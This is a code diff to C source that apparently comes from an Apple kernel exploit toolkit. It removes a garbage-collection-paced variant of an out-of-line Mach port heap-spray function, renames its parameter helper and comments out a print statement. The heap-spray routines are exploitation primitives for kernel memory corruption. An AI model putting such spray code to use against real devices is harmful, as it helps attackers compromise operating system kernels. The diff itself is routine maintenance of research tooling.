@@ -304,13 +304,13 @@ port_insert_send_right(mach_port_t port) {
 }
 
 /*
- * ool_ports_spray_size_with_gc_compute_parameters
+ * ool_ports_spray_size_compute_parameters
  *
  * Description:
- * 	Compute the spray parameters for ool_ports_spray_size_with_gc().
+ * 	Compute the spray parameters for ool_ports_spray_size().
  */
 static void
-ool_ports_spray_size_with_gc_compute_parameters(
+ool_ports_spray_size_compute_parameters(
 		size_t ports_per_ool, size_t message_size, size_t spray_size,
 		size_t *ool_size, size_t *ools_per_message, size_t *ools_needed) {
 	// Each message will contain no more than gc_step bytes of OOL ports.
@@ -338,65 +338,12 @@ ool_ports_spray_size_with_gc_compute_parameters(
 }
 
 size_t
-ool_ports_spray_size_with_gc(mach_port_t *holding_ports, size_t *holding_port_count,
-		size_t message_size, const mach_port_t *ool_ports, size_t ool_port_count,
-		mach_msg_type_name_t ool_disposition, size_t spray_size) {
-	// Compute the parameters for the spray.
-	size_t ool_size, ools_per_message, ools_needed;
-	ool_ports_spray_size_with_gc_compute_parameters(ool_port_count, message_size, spray_size,
-			&ool_size, &ools_per_message, &ools_needed);
-	// Spray to each of the ports in turn until we've created the requisite number of OOL ports
-	// allocations.
-	ssize_t ools_left = ools_needed;
-	size_t sprayed = 0;
-	size_t next_gc_step = 0;
-	size_t port_count = *holding_port_count;
-	size_t ports_used = 0;
-	for (; ports_used < port_count && ools_left > 0; ports_used++) {
-		// Spray this port one message at a time until we've maxed out its queue.
-		size_t messages_sent = 0;
-		for (; messages_sent < MACH_PORT_QLIMIT_MAX && ools_left > 0; messages_sent++) {
-			// If we've crossed the GC sleep boundary, sleep for a bit and schedule the
-			// next one.
-			if (sprayed >= next_gc_step) {
-				next_gc_step += gc_step;
-				pthread_yield_np();
-				usleep(10000);
-				fprintf(stderr, ".");
-			}
-			// Send a message.
-			size_t sent = ool_ports_spray_port(
-					holding_ports[ports_used],
-					ool_ports,
-					ool_port_count,
-					ool_disposition,
-					ools_per_message,
-					message_size,
-					1);
-			// If we couldn't send a message to this port, stop trying to send more
-			// messages and move on to the next port.
-			if (sent != 1) {
-				assert(sent == 0);
-				break;
-			}
-			// We sent a full message worth of OOL port descriptors.
-			sprayed += ools_per_message * ool_size;
-			ools_left -= ools_per_message;
-		}
-	}
-	fprintf(stderr, "\n");
-	// Return the number of ports actually used and the number of bytes actually sprayed.
-	*holding_port_count = ports_used;
-	return sprayed;
-}
-
-size_t
 ool_ports_spray_size(mach_port_t *holding_ports, size_t *holding_port_count,
 		size_t message_size, const mach_port_t *ool_ports, size_t ool_port_count,
 		mach_msg_type_name_t ool_disposition, size_t spray_size) {
 	// Compute the parameters for the spray.
 	size_t ool_size, ools_per_message, ools_needed;
-	ool_ports_spray_size_with_gc_compute_parameters(ool_port_count, message_size, spray_size,
+	ool_ports_spray_size_compute_parameters(ool_port_count, message_size, spray_size,
 			&ool_size, &ools_per_message, &ools_needed);
 	// Spray to each of the ports in turn until we've created the requisite number of OOL ports
 	// allocations.
@@ -428,6 +375,7 @@ ool_ports_spray_size(mach_port_t *holding_ports, size_t *holding_port_count,
 			ools_left -= ools_per_message;
 		}
 	}
+	// fprintf(stderr, "\n");
 	// Return the number of ports actually used and the number of bytes actually sprayed.
 	*holding_port_count = ports_used;
 	return sprayed;
